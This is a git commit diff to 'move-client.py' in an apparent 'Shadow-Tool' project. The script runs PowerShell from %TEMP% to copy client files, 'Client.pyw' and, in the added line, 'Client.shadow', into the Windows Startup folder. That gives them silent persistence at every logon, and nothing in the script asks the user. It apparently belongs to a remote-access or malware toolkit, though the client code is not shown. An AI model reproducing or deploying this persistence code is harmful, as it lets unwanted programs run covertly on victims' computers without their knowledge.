2817ba1cca424eaef0ce07753bd2bb117a93d3a1
Shadowdrums <122622018+Shadowdrums@users.noreply.github.com>
2023-02-13 09:43:37 -0500

    Update move-client.py

--- Shadow-Tool/move-client.py
+++ Shadow-Tool/move-client.py
@@ -22,5 +22,6 @@ import os
 os.system("@ECHO OFF")
 os.system("cd %TEMP%")
 os.system("powershell -command copy-item ./Client.pyw -destination C:\\$env:HOMEPATH\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup")
+os.system("powershell -command copy-item ./Client.shadow -destination C:\\$env:HOMEPATH\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup")
 os.system("powershell -command sleep 2")
 os.system("powershell -command exit")
